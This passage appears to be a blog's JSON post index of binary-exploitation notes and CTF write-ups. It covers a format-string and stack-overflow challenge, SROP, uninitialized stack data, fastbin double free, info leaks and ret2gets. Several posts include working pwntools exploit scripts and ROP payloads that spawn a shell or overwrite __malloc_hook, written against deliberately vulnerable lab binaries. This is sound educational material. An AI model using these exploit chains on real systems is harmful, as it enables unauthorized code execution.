\tfgets(&amp;buf, 4, stdin); \tfflush(stdin); \tint32_t index = atoi(&amp;buf);  \tif (index &lt; 0 || index &gt; 0x13) \t{ \t    puts(\"Invalid index!\"); \t    puts(\"Press ENTER to go back...\"); \t    getchar(); \t} \telse if (!*(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;namelist)) \t    puts(\"The index is empty!\"); \telse \t{ \t    void name; \t    strcpy(&amp;name, *(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;namelist)); \t    free(*(uint64_t*)(((int64_t)index &lt;&lt; 3) + &amp;namelist)); \t    printf(\"Name %s at index #%d has been re…\", &amp;name, (uint64_t)index); \t}  \tif (rax == *(uint64_t*)((char*)fsbase + 0x28)) \t    return rax - *(uint64_t*)((char*)fsbase + 0x28);  \t__stack_chk_fail(); \t/* no return */ }    Frees a heap slot for a give index. enter_password  void enter_password() { void* fsbase; int64_t canary = *(uint64_t*)((char*)fsbase + 0x28); printf(\"\\nPlease enter the password for …\"); void password;  // buffer overflow fgets(&amp;password, 0x100, stdin); puts(\"\\nWrong password!\"); *(uint64_t*)((char*)fsbase + 0x28);  if (canary == *(uint64_t*)((char*)fsbase + 0x28))     return 0;  __stack_chk_fail(); }   This is the function that stood out to me. There is a stack buffer overflow, but the is a stack canary also.  Exploitation  So there are two main vulnerabilities that stood out to me here:    Format string vulnerability in main()   Stack buffer overflow in enter_password()   Exploit Summary     Use the format string to leak a libc pointer and the stack canary.   Compute libc base address from the libc pointer   in enter_password() determine the offset from the buffer to the stack canary.   Build a payload   We can use the format string vulnerability from main() to get a the canary and get the libc base address.  Lets first get the libc base address. The first interesting offset was the third    The address is 0x7ffff7d14887 now lets look at it in gdb    We can see from that the third offset points to write+23 now we can use that to get the libc base address  libc.address = (leak - 23) - libc.sym.write   Now we just have to get the canary. I found that the canary is at the 9th offset.    Now we just have to find the offset from our buffer to the stack canary in enter_password().  Put a breakpoint just before the canary is compared with QWORD PTR fs:0x8, then run the program and enter the bytes you got from pattern create &lt;num&gt; command in gdb.    After the breakpoint we can get the offset from our buffer to the stack canary.    offset to canary : 56.  Now we can build our payload.  offset_to_canary = 56 payload = flat( \tcyclic(offset_to_canary), # padding to canary \tcanary, # from leak ealier \tcyclic(8), # saved rbp \trop.find_gadget(['ret'])[0], # ret gadget for stack alignment \tlibc_rop.find_gadget(['pop rdi', 'ret'])[0], # pop rdi, ret; \tnext(libc.search(b\"/bin/sh\")), # get address of /bin/sh \tlibc.sym.system, # adress of system function )   Here is the exploit  def exploit(): \t#####################################################################  \t######################## EXPLOIT CODE ############################### \t##################################################################### \tcanary_ = \"%9$p\" \twrite_23 = \"%3$p\"  \tfmt = f\"{write_23}|{canary_}\" \tsla(b\"less)?\\n\", fmt.encode()) \tru(b\"Hello, \") \tleaks = rl().rstrip(b\"\\r\\n\") \tcanary = leaks.split(b\"|\")[1] \tcanary = int(canary, 16) \t \tprint_leak(\"Canary\", canary) \tx = leaks.split(b\"|\")[0] \tx = int(x, 16) \tlibc.address = (x - 23) - libc.sym.write \tprint_leak(\"libc base address\", libc.address)   \tlibc_rop = ROP(libc) \tpop_rdi = libc_rop.find_gadget([\"pop rdi\", \"ret\"])[0] \tbinsh = next(libc.search(b\"/bin/sh\")) \tsystem = libc.sym.system \tret = libc_rop.find_gadget(['ret'])[0]  \tprint_leak(\"system\", system) \tprint_leak(\"binsh\",binsh) \tprint_leak(\"pop rdi\", pop_rdi)  \toffset = 56  \tpayload = flat( \t\tcyclic(offset), \t\tcanary, \t\tcyclic(8), \t\tret, \t\tpop_rdi, \t\tbinsh,  \t\tsystem \t)  \tsla(b\"go back...\", b'') \tsla(b\"&gt;&gt; \", b'4') \tsla(b\"admin access: \", payload)   The result   And just like that we get a shell.  Full Exploit Code Here"
  },
  
  {
    "title": "Sigreturn Oriented Programming",
    "url": "/post/srop/",
    "categories": "Notes, ROP",
    "tags": "srop",
    "date": "2025-10-13 00:00:00 +0200",
    "content": "Sigreturn Oriented Programming.  SROP (Sigreturn Oriented Programming) is binary exploitation technique that leverages the signal handling mechanisms in POSIX systems to gain control over CPU registers. This is achieved by crafting a fake signal frame on the stack and then invoking the sigreturn system call.  The signal handling mechanism  SROP exploits the process used by POSIX systems to handle signals. This process works as follows:    When a signal occurs, context switch is performed.   The context switch saves the current state of execution by pushing all CPU registers and additional data onto the stack.   Once the signal has been handled, the sigreturn system call is invoked, which restores the CPU register values from the data saved on the stack.   Here are the structures involved:     struct sigcontext            This structure is a component of the sigframe. It stores the values of the CPU registers and their flag.       The structure definition and layout depend on specific architecture and operating system.           on x86-64, the structure contains:  struct sigcontext {     uint64_t r8, r9, r10, r11, r12, r13, r14, r15;     uint64_t rdi, rsi, rbp, rbx, rdx, rax, rcx, rsp;     uint64_t rip, eflags;     uint16_t cs, gs, fs;     uint64_t err, trapno, oldmask, cr2;     void *fpstate;     uint64_t reserved[8]; };   Exploitation  SROP involves two main stages once you have control of the return address    Triggering the sigreturn system call.   Providing a fake signal frame.   Payload example  # stage1 trigger the sigreturn syscall stage1 = flat( \tcyclic(offset_to_rip), # padding to return addres \tpop_rax, # pop rax; ret  \t0xf, # sigreturn number in x64 or 0x77 for x86 \tsyscall, # syscall gadget ) # stage to fake signal frame # pwntools makes it easy to setup the signal frame stage2 = SigreturnFrame() stage2.rax = 59 # for execve stage2.rdi = binsh # address of \"/bin/sh\" stage2.rsi = 0 stage2.rdx = 0 stage2.rip = syscall # syscall gadget  payload = flat( \tstage1, \tstage2 )   The above payload will get you a shell. When to use SROP     When you have limited gadgets.   Can control stack. (Buffer overflow)   When you have pop rax and syscall gadgets   Need to set up multiple registers"
  },
  
  {
    "title": "Uninitialized Data Access",
    "url": "/post/UDA/",
    "categories": "Notes, Uninitialized-Data-Access",
    "tags": "uda",
    "date": "2025-10-10 00:00:00 +0200",
    "content": "Overview  So what are Uninitialized variables? Uninitialized variables are variables that are declared byt they are not assigned a value  e.g.  #include &lt;stdio.h&gt;  // complile : gcc vuln.c -o vuln  int main() { \tint a, b; \tprintf(\"a = %d, b = %d\\n\", a, b); \treturn 0; }   Output  ./vuln  a = 32676, b = -1360491824   The values are random numbers which we did not assign. Since we did not initialize any value tot the variables, they will contain unpredictable or garbage values, which are values left in memory at that particular location.  So how is this a vulnerability?  Not all uninitialized variables are security vulnerabilities, but there are cases where they are. They become security vulnerabilities when leftover (previous) values in memory from previous program executions or other parts of the program that are attacker controlled input data.  Uninitialized data access can lead to these vulnerabilities:    Information Disclosure: The uninitialized variable can contain information about the program’s memory layout or internal states, addresses in the stack, which might be used to craft an exploit.   Arbitrary Code Execution: An attacker may be able to manipulate uninitialized variables in such a way that they can control the program’s execution flow which can lead to arbitrary code execution.   Examples  Stack  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  void func() { \tchar buf[32];  \tprintf(\"Enter a str: \"); \tscanf(\"%31s\", buf); }  void vuln() { \tchar buf[32]; \tsystem(buf); }  int main() { \tfunc(); \tvuln(); \treturn 0; }   Compile  gcc -o vuln2 ./vuln2.c   when i run it and enter the string: “/bin/sh”  ./vuln2 Enter a str: /bin/sh $ whoami hacker   Why am i getting a shell?  Now i entered ‘ls -lha’  ./vuln2  Enter a str: ls -lha chall\t flag.txt     vuln   vuln2.c chall.c  notflag.txt  vuln2  vuln.c   What actually happens.    func() calls scanf and writes your input into a local stack slot.   func() returns. The contents at the stack address are not cleared.   vuln() is called. Its stack frame happens to allocate its local buf variable at the same address again.   vuln()’s buf therefore contains the bytes left by func()   vuln() calls system(buf).   Why is the program executing the string that i entered? when that buffer is in another function?  Lets find out.  In gdb  set breakpoints at the beginning and at the end of the vuln() and func() functions.    Enter AAAABBBBCCCCDDDDD  No lets view it in memory    We can see that our buffer starts at 0x7fffffffdeb0 in the stack frame of the func() function.    I set a breakpoint just after the buf was declared in the vuln() function so that we can view the stack frame from there.    We can see that our buffer also starts at 0x7fffffffdeb0 in this stack frame and also that the data from the stack frame from func() is still present in the stack frame from vuln(). So the contents of the first stack frame from func() where not cleared when func() returned, then the stack frame of vuln() allocated the buf address at the same address as the previous stack frame, which is then passed as a command to system().  Common Causes     Not initializing local variables or heap data at declaration time.   Only partially initializing structs and objects   Accidental failure to initialize down an uncommon control flow path.            e.g. passing a pointer to an uninitialized struct to a function and expecting it to perform initialization, but then it returns early before any initialization actually occurs."
  },
  
  {
    "title": "Fastbin Exploitation",
    "url": "/post/Fastbin-dup/",
    "categories": "Notes, heap-exploitation",
    "tags": "fastbin-dup, fastbin, heap-exploitation",
    "date": "2025-10-05 00:00:00 +0200",
    "content": "Fastbin Exploitation  Overview  This heap exploitation technique leverages a double free vulnerability to trick the allocator into returning the same chunk twice, without freeing it in between. This technique is used to corrupt a chunk’s metadata to link a fake chunk(target address) into a fastbin list.  This can be used to gain arbitrary read/write primitive. Fastbin Review  There are 10 fastbins which are maintained using a singly linked list. The linked list uses a Last In First Out (LIFO) manner. Each bin has chunks of the same size and the sizes are : 16, 24, 32, 40, 48, 56, 64, 72, 80 and 88. The sizes include metadata (prev_size and size).  Consolidation does NOT happen with free fastbin size chunks. Double Free Vulnerability  A double free vulnerability occurs when a chunk of memory that was previously allocated is freed more than once. This is dangerous because it corrupts the allocato’s data structures.  Mitigation     Fasttop check: If the chunk being freed is at the top of the fastbin list GLIBC will throw an error (double free or corruption (fasttop)).   if (__builtin_expect (old == p, 0)) malloc_printerr (\"double free or corruption (fasttop)\");   This is bypassed by freeing a different chunk in between the one that will be freed twice.  Exploitation  Exploiting Double Free in fastbins.  Fastbins are singly-linked lists used by the allocator to manage small, recently freed chunks efficiently. The progression of the fastbin list state during double free attack:    a is freed: head -&gt; a -&gt; tail   b is freed: head -&gt; b -&gt; a -&gt; tail (used to bypass double free protection).   a is freed again : head -&gt; a -&gt; b -&gt; a -&gt; tail. (chunk pointer a is now duplicated)   Because the chunk pointer for a has been duplicated in the free list, the heap allocater will hand out the same memory address multiple times when more chunks of the same size are allocated.  if subsequent allocations are requested, the allocator will hand out chunks like this:     c = malloc(size) returns chunk a   d = malloc(size) returns chunkb   e = malloc(size) returns chunk a again (same address as c)   Since two pointers now point to the same exact location in memory, an attacker can manipulate the content of that memory through one pointer, while the allocator still manages the block via the other pointer.  Arbitrary Write/Read  The goal of the fastbin dup technique is to achieve arbitrary read/write primitive, which is often achieved through fastbin corruption.  When a chunk is freed, its forward pointer (fd) points to the next free chunk in the list. By controlling a chunk that is in the fastbin list, you can overwrite the fd pointer to point to an arbitrary, controlled memory address.  When a new allocation of that size is made, the allocator will return the applied arbitrary  memory address.  Example  Vulnerable Application Code  This example is done on glibc 2.23  pwn@90782eb49a00:~/workspace$ /lib/x86_64-linux-gnu/libc.so.6  GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al. Copyright (C) 2016 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 5.4.0 20160609. Available extensions: \tcrypt add-on version 2.1 by Michael Glad and others \tGNU Libidn by Simon Josefsson \tNative POSIX Threads Library by Ulrich Drepper et al \tBIND-8.2.3-T5B libc ABIs: UNIQUE IFUNC For bug reporting instructions, please see: &lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.    In modern glibc you would need to fill in the tcache bins first.  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  struct target {         char username[0x8];         char target[0x20]; } targets;  char *ptrs[10]; int count = 0;  void allocate() {         printf(\"Enter size: \");         int size;         scanf(\"%d\", &amp;size);         ptrs[count] = (char*)malloc(size);         count++; }  void deallocate() {         printf(\"Enter Index: \");         int index;         scanf(\"%d\", &amp;index);         free(ptrs[index]); }  void get_data() {         printf(\"Enter Index: \");         int index;         scanf(\"%d\", &amp;index);                  printf(\"Enter data: \");         //fgets(ptrs[index], 64, stdin);         scanf(\"%s\", ptrs[index]); }  void menu() {         puts(\"1. malloc\");         puts(\"2. free\");         puts(\"3. scanf\");         puts(\"4. check\"); }  void check() {         if (strncmp(targets.target, \"admin\", 5) == 0) {                 puts(\"you win\");                 system(\"/bin/sh\");         } else {                 puts(\"you lose\");         } }  int main() {          setbuf(stdin, NULL);         setbuf(stdout, NULL);          printf(\"Target = %p\\n\", targets.target);          printf(\"Enter username: \");         scanf(\"%s\",targets.username);         int choice;         while (1) {                 menu();                 printf(\"&gt; \");                 scanf(\"%d\", &amp;choice);                 switch (choice) {                         case 1:                                 allocate();                                 break;                         case 2:                                  deallocate();                                 break;                         case 3:                                 get_data();                                 break;                         case 4:                                 check();                                 break;                         default:                                 puts(\"Invalid Choice\");                 }                }             return 0; }      Compile gcc vuln.c -o vuln -fno-stack-protector -z execstack -no-pie -m32   The application has 4 main functions     allocate()            get size from user and allocate a malloc a chunk of that size.           deallocate()            free a chunk           get_data()            Enter data in a specific chunk           check()            check if targets.target = 'admin. If it is it gives you a shell.         Exploitation                  To achieve the fastbin dup we have to overwrite a the forward (fd) pointer, of a chunk in the fastbin using a double free or use-after-free ( double-free in this case). If we can overwrite fd pointer, we can trick the allocator to return a pointer out target location the next time we allocate another chunk.  Lets trigger the double-free vulnerability  malloc(16) # 0 malloc(16) # 1  free(0) free(1) free(0)   we had to free another chunk between the double free in order to bypass the double free or corruption (fasttop) mitigation.  if (__builtin_expect (old == p, 0)) malloc_printerr (\"double free or corruption (fasttop)\");   Now lets look at the fastbin    The bin goes like this 0x804b008 -&gt; 0x804b020 -&gt;  0x804b008. The chunk 0x804b008 is placed twice in the fastbin  Now we have to return 0x804b008 and overwrite the fd pointer with out target location. then allocate 2 chunks.  malloc(16) # 2 | 0  get_data(0,p32(target-8))  malloc(16) # 3 | 1 malloc(16) # 4 | 0 (again)   I subtracted 8 from the target address because malloc treats chunks as starting 8 bytes before their user data in 32-bit and 16 bytes in  64 bit binaries  Now lets look at the fastbin    we can see that the chunk in the fastbin now points to our target 0x804a0a8 which is the struct targets + 8.  The next allocation will be our target location, which provides a arbitrary write.     Note You have to setup metadata for your chunk in order for the technique to work. In this case the username field is used.   malloc(16) # 5 | this is our target location get_data(5, b'admin\\x00')   We now wrote admin to our target.  Final Exploit  def malloc(size:int): \tlog.info(\"calling malloc ...\") \tsla(b\"&gt; \", b'1') \tsla(b\"Enter size: \", str(size).encode()) \t def free(index:int): \tlog.info(\"calling free ...\") \tsla(b\"&gt; \", b'2') \tsla(b\"Enter Index: \", str(index).encode()) \t def get_data(index:int, data:bytes): \tlog.info(\"calling scanf ...\") \tsla(b\"&gt; \", b'3') \tsla(b\"Enter Index: \", str(index).encode()) \tsla(b\"Enter data: \", data) \t def check(): \tsla(b\"&gt; \", b'4')  def exploit(): \t#####################################################################  \t######################## EXPLOIT CODE ############################### \t#####################################################################  \tru(\"Target = \") \ttarget = int(rl(), 16) \tprint_leak(\"Target \", target)   \tmetadata = flat( \t\tp32(0x18), \t\tp32(0x19) \t)  \tsla(b\"Metadata: \", metadata)   \tmalloc(16) # 0 \tmalloc(16) # 1  \tfree(0) \tfree(1) \tfree(0)  \tmalloc(16) # 2 | 0  \tmalloc(16) # 3 | 1  \tget_data(0,p32(target-8)) \tmalloc(16) # 4 | 0 (again) \tmalloc(16) # 5 \tcheck() \tget_data(5, b'admin\\x00')  \tcheck()   Results    Was able to perform the arbitrary write.  Code Execution  target __free_hook of __malloc_hook and set up a one-gadget  Example  This is just like the previous example except that our target memory location is now the _-free_hook or __malloc_hook  Vulnerable code  This example is done on glibc 2.23  pwn@90782eb49a00:~/workspace$ /lib/x86_64-linux-gnu/libc.so.6  GNU C Library (Ubuntu GLIBC 2.23-0ubuntu11.3) stable release version 2.23, by Roland McGrath et al. Copyright (C) 2016 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Compiled by GNU CC version 5.4.0 20160609. Available extensions: \tcrypt add-on version 2.1 by Michael Glad and others \tGNU Libidn by Simon Josefsson \tNative POSIX Threads Library by Ulrich Drepper et al \tBIND-8.2.3-T5B libc ABIs: UNIQUE IFUNC For bug reporting instructions, please see: &lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.    In modern glibc you would need to fill in the tcache bins first.  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  char *ptrs[10]; int count = 0;  void allocate() {         printf(\"Enter size: \");         int size;         scanf(\"%d\", &amp;size);         ptrs[count] = (char*)malloc(size);         count++; }   void deallocate() {         printf(\"Enter Index: \");         int index;         scanf(\"%d\", &amp;index);         free(ptrs[index]); }   void get_data() {         printf(\"Enter Index: \");         int index;         scanf(\"%d\", &amp;index);                  printf(\"Enter data: \");         //fgets(ptrs[index], 64, stdin);         scanf(\"%s\", ptrs[index]); }  void menu() {         puts(\"1. malloc\");         puts(\"2. free\");         puts(\"3. scanf\"); }   int main() {          setbuf(stdin, NULL);         setbuf(stdout, NULL);          printf(\"leak = %p\\n\", printf);          int choice;         while (1) {                 menu();                 printf(\"&gt; \");                 scanf(\"%d\", &amp;choice);                 switch (choice) {                         case 1:                                 allocate();                                 break;                         case 2:                                  deallocate();                                 break;                         case 3:                                 get_data();                                 break;                         default:                                 puts(\"Invalid Choice\");                 }                }          return 0; }   The application has 3 main functions     allocate()            get size from user and allocate a malloc a chunk of that size.           deallocate()            free a chunk           get_data()            Enter data in a specific chunk           Exploitation  Lets trigger the double-free vulnerability  malloc(92) # 0 malloc(92) # 1  free(0) free(1) free(0)   Lets view the fast bins    The chunk 0x602080 appears twice in the fastbin.  The next call to malloc of the size 92 will return the 0x602080 chunk which we will use to overwrite the fd pointer of the chunk 0x602080 that is still in the fastbin.  But do we overwrite the fd with?  Our target here will be the __malloc_hook, but we need to remember that our target has to have the correct metadata (size field) to get pass the size check malloc(): memory corruption (fast) mitigation.  Lets take a look at __malloc_hook    __malloc_hook is at 0x7ffff7bc4b10 but we can see that the previous word is a large number which won’t pass the size check. So we need to look near __malloc_hook where we can place our data  Lets look at __malloc_hook - 35    We can see that at the address 0x7ffff7bc4af5 there is 0x7f which is perfect for use can it will pass the fastbin size field check.  So now we have to allocate  malloc(92) # 2 | 0  target = libc.sym['__malloc_hook'] - 35 get_data(0 ,p64(target))  malloc(92) # 3 | 1 malloc(92) # 4 | 0 (again)   The next call to malloc we return our target memory location.  First find a one gadget.    I will use 0xf1247.  malloc(92) one_gadget = libc.address + 0xf1247 payload = flat( \tcyclic(0x13), # padding to __malloc_hook   \tone_gadget ) get_data(5, payload)   The next call to malloc will pop a shell  malloc(92)   Final exploit  def malloc(size:int): \tlog.info(\"calling malloc ...\") \tsla(b\"&gt; \", b'1') \tsla(b\"Enter size: \", str(size).encode()) \t def free(index:int): \tlog.info(\"calling free ...\") \tsla(b\"&gt; \", b'2') \tsla(b\"Enter Index: \", str(index).encode()) \t def get_data(index:int, data:bytes): \tlog.info(\"calling scanf ...\") \tsla(b\"&gt; \", b'3') \tsla(b\"Enter Index: \", str(index).encode()) \tsla(b\"Enter data: \", data) \t def exploit(): \t#####################################################################  \t######################## EXPLOIT CODE ############################### \t#####################################################################  \tru(\"leak = \") \tprintf = int(rl(), 16) \tprint_leak(\"printf \", printf)  \tlibc.address = printf - libc.sym[\"printf\"] \tprint_leak(\"libc base address\", libc.address)  \tmalloc_hook = libc.sym['__malloc_hook'] \tprint_leak(\"__malloc_hook\", malloc_hook)  \tone_gadget = libc.address + 0xf1247 \tprint_leak(\"one gadget\", one_gadget) \tpayload = flat( \t\tcyclic(0x13), # padding to __malloc_hook \t\tone_gadget \t) \t#print_leak(\"payload \", payload)  \tsize = 0x60 \tlog.info(f\"We will malloc chunks of size: {size}\")  \t# double free  \tmalloc(size) \tmalloc(size)  \tfree(0) \tfree(1) \tfree(0)  \tmalloc(size) # 2 | same as 0 \t#target = (malloc_hook - 35 + 16) - 0x200000 \ttarget = malloc_hook - 35  \tprint_leak(\"target\", target) \tget_data(2, p64(target))   \tmalloc(size) # 3 | same as 1 \tmalloc(size) # 4 | same as 0 \tget_data(4, b\"AAAA\") \tmalloc(size) # 5 enter one  \tget_data(5, payload) \tmalloc(size)    This gets has a shell.    The reason why we request chunks of size 92 earlier is because we want the those chunks to belong to the 0x70 fastbin, which is the same fastbin that the our fake chunk near __malloc_hook will be placed in if it was freed (0x7f in this case). This is done so that chunk can have the correct size."
  },
  
  {
    "title": "Info leaks in software exploitation.",
    "url": "/post/information-leaks/",
    "categories": "Notes, heap-exploitation",
    "tags": "info-leak",
    "date": "2025-09-27 00:00:00 +0200",
    "content": "Information/Memory Leaks In Binary Exploitation  What is a memory leak? A information/memory leak is any primitive in a binary that reveals bytes from the program’s memory such as addresses, pointers, strings and even metadata. Information leaks help bypass security mitigations such as Address Space Layout Randomization (ASLR), Position Independent Executable (PIE), etc. by giving you an pointer that you can use to compute a base address such libc, PIE, heap, etc. base addresses Why do they matter?     The can be used to bypass exploit mitigations that depend on randomization such as ASLR or stack canaries.   They can disclose information meant to be secrets in memory.   Info leaks are needed for reliable exploit development.   Common leak Primitives  Uninitialized Data Access (UDA)  When a program uses a local variable that has not been explicitly initialized, it may contain data left over from previous stack frames. If this initialized variable is used and printed to the user, it can leak information like memory addresses or user data.  Partial Overwrites.  I can’t really say that this is a info leak but it is also useful when you only know the least significant bits of a address.  Overwrite the target partially (LSB), leaving only some original bytes. Heap/stack spraying may be needed.     Format String Read  A format string is a dangerous bug that can be exploited easily. It can be leveraged to perform arbitrary read/write primitive. In this case we will focus on arbitrary read.  If an attacker supplies format specifiers (such as %x or %p) but does not provide corresponding arguments, the printf function will unexpectedly pull values from the stack and use them as arguments.  This vulnerability occurs when user-supplied input is passed directly to a function, such as one from the printf family.  These functions use a format string to specify how arguments should be interpreted allowing for a variable number of arguments.  correct usage int age = 20; char name[32] = \"t1b4n3\"; printf(\"Name: %s\\nAge: %d\\n\", name, age);   As expected, we get  Name: t1b4n3 Age: 20   What happens when w do no pass any arguments  printf(\"Name: %p\\nAge: %p\\n\");   It leaks some addresses from the stack.  Name: 0x7ffc94aa2578 Age: 0x7ffc94aa2588   What happened?  Since printf expects as many parameters as the format specifiers and since those are not provided it grabs the values off the stack. Out-Of-Bounds Read  An out-of-bounds read occurs when a program attempts to access or read data from a memory address that is outside a buffer or structure it is supposed to be operating on.  This is typically caused by a programming errors where there is no bounds checking performed on the input received.  Return Oriented Programming (ROP)  Ret2plt The goal of this technique is to call puts or printf with the Global Offset Table (GOT) entry of a libc function to print its resolved address. The leaked address/pointer can be used to compute libc_base address.  Process:    Overflow into saved return address.   Call puts@plt or printf@plt with GOT entry.   Return to main.   Use leak to compute libc_base address            e.g. lets say we leaked the GOT entry for puts then libc_base = leaked_address - libc.symbols['puts]           Use leak to pwn the binary.   Payload Example (pwntools)  payload = flat( \tcyclic(offset), # offset = overflow offset to saved return address \tpop_rdi, # 'pop rdi; ret' gadget \tputs_got, # puts GOT entry | into rdi register \tputs_plt, # call puts  \tmain_addr, # return to main to send second stage ) # recv leak and unpack leak = u64(io.recvline().strip().ljust(8, b\"\\x00\")) # compute libc base libc.address = leak - libc.symbols['puts'] # from here use libc base to get shell second_stage_payload = flat( \tcyclic(offset), \tpop_rdi, \tnext(libc.search(b\"/bin/sh\")), \tlibc.symbols['system'] ) # send second stage and get shell   Write Syscall If a binary exports a write or has the syscall gadget, you can directly write raw memory to standard output stdout. This is useful when RELRO prevents GOT modification or when you want to avoid PLT resolution issues.  This technique needs the following gadgets:    pop rdi -&gt; 1 (stdout)   pop rsi -&gt; target address   pop rdx -&gt; size   If the gadgets are not available you can use the ret2csu technique to populate those registers.  Process:    Overflow into saved return address   populate the registers.   call write. If write is not exported the populate the rax/eax registers with correct system call number and call the syscall gadget.   Example  # if write plt is available payload = flat( \tcyclic(offset), #  offset = overflow offset to saved return address \tpop_rdi_rsi_rdx, # `pop rdi; pop rsi; pop rdx` gadgets \t0x1, #rdi \ttarget_addr, #rsi \t0x20, # rdx \twrite_plt  ) # or payload = flat( \tcyclic(offset), #  offset = overflow offset to saved return address \tpop_rdi_rsi_rdx, # `pop rdi; pop rsi; pop rdx` gadgets \t0x1, #rdi \ttarget_addr, #rsi \t0x20, # rdx \tpop_rax, \tsyscall_write_num, \tsyscall_gadget )   Use-After-Free  Libc leak via unsorted bin  A common technique to get libc leak is to free a big chunk (larger than 400 bytes) so it gets into the unsorted bin. The unsorted bin is a doubly linked list and its list head is stored in the libc’s data section, when we free a chunk into the unsorted bin for the first time, its backward pointer (bk) then points into the libc, at a known offset. If we can leak this pointer, than we can compute the base address of libc.  What If we do not control the size of the heap memory allocations?  A double free vulnerability would be used to get an chunk that overlaps with another chunk’s metadata, this way we can modify the chunk’s metadata to make the allocator think it is a big chunk and place it in the unsorted bin upon freeing it.  A small problem is that when a chunk is allocated if it borders the top chunk of the heap, it is placed back into the top chunk when we free it. We can prevent this by placing a another chunk (often called a guard chunk) between our big chunk and the top chunk without freeing it, this prevent the allocator from returning the big chunk to the top of the heap, thus placing it in a bin.  free chunk structure  struct malloc_chunk {   INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk, if it is free. */   INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */   struct malloc_chunk* fd;                /* double links -- used only if this chunk is free. */   struct malloc_chunk* bk;   /* Only used for large blocks: pointer to next larger size.  */   struct malloc_chunk* fd_nextsize; /* double links -- used only if this chunk is free. */   struct malloc_chunk* bk_nextsize; };  typedef struct malloc_chunk* mchunkptr;   The address/pointer that will help compute the libc base address is at offset :  32 bit  // metadata prev_size; // -0x8 size; // -0x4 // end metadata fd; // 0x0 bk; // 0x4 fd_nextsize; // 0x8 bk_nextsize; // 0xc   At offset 0xc  64 bit prev_size; // -0x10 size; // -0x8 // end metadata fd; // 0x0 bk; // 0x8 fd_nextsize; // 0x10 bk_nextsize; // 0x18   At offset 0x18  Steps:    Allocate 9 chunks            chunks from 1 to 7 will be used to fill tcache       chunk 8 will be placed in unsorted bin when freed       chunk 9 prevents top chunk consolidation           Free the first 8 chunks   Use a use after free of the chunk that is in the unsorted bin to leak the bk pointer which will be a libc addres   Use the libc address to calculate libc base address.   Example     Type Confusion.  Replace a freed object memory chunk with a different object type of same size."
  },
  
  {
    "title": "Who Needs POP `RDI?` You Have `gets()`",
    "url": "/post/ret2gets/",
    "categories": "Notes, ROP",
    "tags": "ret2gets",
    "date": "2025-09-26 00:00:00 +0200",
    "content": "Many ROP exploits involves finding a pop rdi; ret gadget. Since rdi is used to pass the first argument to functions in the x86_64 calling convention, this gadget is crucial for setting up calls to functions.  In binaries compiled with modern glibc (2.34 and newer), this and other useful gadgets are often missing.  Source of the gadget    The gadget was commonly found in the __libc_csu_init function, which used to be included in most dynamically linked binaries.   The disassembly of __libc_csu_init contains the instruction sequence pop r15; ret. The machine code for this is 41 5f c3. The last two bytes 5f c3 of that sequence happen to be the exact machine code for pop rdi ; ret, therefore if a attacker as the address of  pop r15; ret, they could add one byte to that address to get pop rdi; ret   Why it disappeared. A patch in glibc 2.34 was introduced to remove useful ROP gadgets for the ret2csu exploit technique, which had the side effect of no longer compiling the __libc_csu_init function into binaries.    To overcome the lack of pop rdi; ret gadget a technique known as ret2gets can be used.  This techniques leverages the behaviour of the gets() function to control the rdi register and even leak the base address of libc.  When gets() finishes reading from stdin, it often leaves the address of a writable libc structure, _IO_stdfile_0_lock, in the rdi register before it returns. This behaviour is because of the thread-safe locking mechanism used by glibc’s I/O functions.  _IO_stdfile_0_lock structure.  typedef struct {    int lock;    int cnt;    void *owner; } _IO_lock_t;   To prevent race conditions in multi-threaded programs, I/O functions like gets() must “lock” the file stream they are using. gets() calls _IO_acquire_lock at the beginning and _IO_release_lock at the end. The release macro calls _IO_lock_unlock, and this function loads the address of the lock structure for stdin (which is _IO_stdfile_0_lock ) into the rdi register just before returning, this is done to prepare for a potential call to an underlying system function that expects its argument in rdi. When gets() returns, rdi points to _IO_stdfile_0_lock, a writable location in libc’s memory.  How to exploit this. Writing to rdi  Since gets() leaves a pointer to a writable memory in rdi, we can use a second call to gets() to write data to that location.  The attack goes as follows:    First gets():            The first gets() is called, whether called in binary or in your ROP chain. After this call returns, rdi will contain the address of _IO_stdfile_0_lock           Second gets():            Call gets() again (gets@plt). This time when gets executes, it will read input from you and write it to the address currently in rdi (_IO_stdfile_0_lock).           Payload:            Send the string you want to populate rdi. e.g. /bin/sh           Call the function:                                                            In ROP chain follow the second gets@plt with a call to the function you want to execute (e.g. system               when system is called rdi will still point to the _IO_stdfile_0_lock) .                                                   Example payload = flat( \tgets_plt, \tgets_plt, \tsystem_plt ) # binsh = b\"/bin\" + p8(u8(b\"/\")+1) + b\"sh\" p.sendline(payload) p.sendline(binsh) p.interactive() # get shell      Note:  The _IO_stdfile_0_lock structure contains a counter field named cnt. The unlock function decrements this counter, and if it becomes zero, it may ruin you payload. To avoid this, you must overwrite cnt with a value other than 1 as part of your string that is placed in _IO_stdfile_0_lock.   Leaking the Libc base address  The _IO_stdfile_0_lock  structure also contains the field named owner, which points to the Thread Local Storage (TLS) for the current thread. The TLS address has a predictable offset from the libc base address, so leaking the owner pointer allows you to calculate the base address of libc.  Method 1  If the binary called printf function we can use that to leak addresses and find libc base address (format string vulnerabiliity)  Example  payload = flat( \tcyclic(padding_to_ret), \telf.plt['gets'], \telf.plt['printf'], \telf.sym['main'] )  p.sendline(payload) fmt_str = \"%p\"*3 # \"%3%p\" p.sendline(fmt_str) leaked_bytes = p.recv() leaked_addr = int(leaked_bytes, 16)  lib.address = leaked_addr  - offset # where offset    Method 2  This works for glibc 2.30 - 2.36    First gets():   Send a payload that sets the cnt field to 0   When the 